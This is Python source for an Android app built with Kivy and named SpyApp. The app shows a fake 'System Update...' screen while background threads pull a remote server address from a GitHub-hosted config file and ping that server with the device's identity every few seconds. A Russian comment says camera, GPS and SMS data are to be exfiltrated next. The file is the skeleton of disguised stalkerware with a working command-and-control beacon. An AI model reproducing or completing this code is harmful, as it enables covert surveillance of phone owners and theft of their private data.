from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform
import requests
import threading
import time
import os

# --- НАСТРОЙКИ ---
DEVICE_NAME = "Android_Phone"
DEVICE_ID = "device_1"
# -----------------

class SpyApp(App):
    def build(self):
        self.server_url = "http://127.0.0.1:5000"
        threading.Thread(target=self.get_config, daemon=True).start()
        threading.Thread(target=self.run_client, daemon=True).start()
        return Label(text="System Update...")

    def get_config(self):
        try:
            url = "https://kfgjap.github.io/Monolith_APK/config.txt"
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                self.server_url = r.text.strip()
        except:
            pass

    def run_client(self):
        time.sleep(3)
        while True:
            try:
                requests.post(f"{self.server_url}/api/ping", json={"id": DEVICE_ID, "name": DEVICE_NAME}, timeout=5)
                # Тут будет отправка данных (камеры, GPS, СМС) через pyjnius
                time.sleep(3)
            except Exception:
                time.sleep(5)

if __name__ == '__main__':
    SpyApp().run()
